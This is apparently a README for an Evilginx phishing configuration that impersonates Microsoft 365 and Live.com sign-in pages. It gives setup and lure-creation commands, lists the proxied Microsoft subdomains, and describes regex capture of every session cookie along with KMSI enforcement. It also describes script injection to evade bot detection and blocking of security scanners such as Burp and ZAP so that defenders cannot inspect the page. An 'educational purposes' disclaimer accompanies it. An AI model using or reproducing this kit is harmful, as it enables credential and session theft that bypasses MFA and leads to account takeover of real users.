# Microsoft 365 & Live.com Phishlet V2

**Author:** billion_laughs  
**Version:** 2.0.0  
**Created:** November 20, 2025

---

## Description

This is an advanced phishlet for Microsoft 365 and Live.com authentication, featuring:

- **Complete subdomain coverage** for Microsoft authentication flow
- **Regex-based cookie capture** to catch all session tokens
- **Custom JavaScript injection** for bot detection bypass
- **Cookie logging** for debugging and analysis
- **Request/response hooks** for advanced manipulation
- **Custom CSS** for fixing rendering issues

---

## Features

### Core Functionality
- ✅ Microsoft 365 authentication
- ✅ Live.com authentication
- ✅ Outlook.com webmail
- ✅ Microsoft account management
- ✅ Multi-factor authentication (MFA) support
- ✅ "Keep me signed in" (KMSI) enforcement

### Advanced Features (NEW in V2)
- ✅ **Bot detection bypass** - Simulates human behavior
- ✅ **Cookie logger** - Tracks all cookies for debugging
- ✅ **Custom hooks** - Modify requests and responses
- ✅ **Static file injection** - Add custom JS/CSS
- ✅ **Rate limiting** - Prevent abuse
- ✅ **Security scanner blocking** - Block Burp, ZAP, etc.

---

## Configuration

### Proxy Hosts

This phishlet proxies the following subdomains:

| Subdomain | Original | Domain | Purpose |
|-----------|----------|--------|---------|
| login | login | live.com | Primary login page |
| cdn | logincdn | msauth.net | CDN for login assets |
| account | account | live.com | Account management |
| storage | storage | live.com | Storage services |
| outlook | outlook | live.com | Outlook webmail |
| microsoft | account | microsoft.com | Microsoft account |
| www | www | microsoft.com | Microsoft www |
| ssl | compass-ssl | microsoft.com | SSL compass |

### Authentication Tokens

The phishlet captures **all cookies** using regex patterns:

- `.login.live.com` - MSPOK and all other cookies
- `.live.com` - All cookies
- `.microsoft.com` - All cookies
- `.account.microsoft.com` - All cookies

---

## Usage

### 1. Installation

Copy this directory to your Evilginx `phishlets_v2/` folder:

```bash
cp -r microsoft365/ /path/to/evilginx/phishlets_v2/
```

### 2. Load the Phishlet

```bash
# In Evilginx terminal
phishlets load microsoft365
```

### 3. Configure Hostname

```bash
phishlets hostname microsoft365 your-domain.com
```

### 4. Enable the Phishlet

```bash
phishlets enable microsoft365
```

### 5. Create a Lure

```bash
lures create microsoft365
lures get-url 0
```

---

## Customization

### Adding Custom JavaScript

1. Create a new JavaScript file in `static/scripts/`
2. Add it to `manifest.json5`:

```json5
static_files: {
  scripts: [
    {
      path: 'static/scripts/your-script.js',
      inject_at: 'login.live.com',
      inject_position: 'head_end',
      inject_condition: 'always',
    },
  ],
}
```

### Adding Custom CSS

1. Edit `static/styles/custom.css`
2. The CSS is automatically injected into all pages

### Modifying Hooks

Edit the hook files to customize behavior:

- `static/hooks/on_request.js` - Modify incoming requests
- `static/hooks/on_response.js` - Modify outgoing responses

---

## Static Files

### Scripts

| File | Purpose | Injection |
|------|---------|-----------|
| `bot-bypass.js` | Bot detection bypass | Head end, always |
| `cookie-logger.js` | Cookie debugging | Body end, login page only |

### Styles

| File | Purpose | Injection |
|------|---------|-----------|
| `custom.css` | Custom styling | Head end, always |

### Hooks

| File | Purpose | Execution |
|------|---------|-----------|
| `on_request.js` | Request modification | Every request |
| `on_response.js` | Response modification | Every response |

---

## Debugging

### View Cookie Logs

Open browser console and look for `[Cookie Set]` and `[Cookie Logger]` messages.

### Export All Cookies

In browser console:

```javascript
exportCookies()
```

This will output all cookies as JSON.

### View Hook Logs

Check Evilginx logs for `[OnRequest]` and `[OnResponse]` messages.

---

## Security Considerations

### Bot Detection Bypass

The `bot-bypass.js` script implements several techniques:

1. Mouse movement simulation
2. Navigator property overriding
3. Realistic timing delays
4. Permission simulation
5. Canvas fingerprint randomization
6. User interaction timing

**Note:** These techniques are for educational/testing purposes only.

### Rate Limiting

The `on_request.js` hook implements basic rate limiting:

- **Limit:** 100 requests per minute per IP
- **Action:** Block with 429 status code

### Security Scanner Blocking

The following tools are automatically blocked:

- Burp Suite
- OWASP ZAP
- sqlmap
- nikto
- nmap
- masscan

---

## Troubleshooting

### Issue: Cookies Not Captured

**Solution:** Check that the regex patterns in `auth_tokens` are correct. The current configuration uses `.*,regexp` to capture all cookies.

### Issue: Bot Detection Triggered

**Solution:** Ensure `bot-bypass.js` is being injected. Check browser console for initialization message.

### Issue: Login Page Not Loading

**Solution:** Check that all proxy_hosts are correctly configured and DNS is pointing to your Evilginx server.

### Issue: Redirect Loop

**Solution:** Verify that `sub_filters` are correctly replacing all domain references.

---

## Changelog

### Version 2.0.0 (2025-11-20)
- Initial V2 release with JSON5 format
- Added static file injection support
- Added bot detection bypass
- Added cookie logging
- Added request/response hooks
- Added custom CSS
- Added comprehensive documentation

### Version 1.0.0 (Previous)
- Original YAML-based phishlet
- Basic proxy configuration
- Cookie capture
- Credential capture

---

## Credits

- **Original Phishlet:** @An0nud4y
- **V2 Enhancement:** billion_laughs
- **Evilginx:** Kuba Gretzky (@mrgretzky)

---

## License

This phishlet is for **educational and authorized security testing purposes only**. Unauthorized use is illegal and unethical.

---

## Support

For issues or questions:

1. Check the troubleshooting section above
2. Review Evilginx logs
3. Check browser console for JavaScript errors
4. Verify DNS and SSL configuration

---

**Happy (Ethical) Phishing! 🎣**
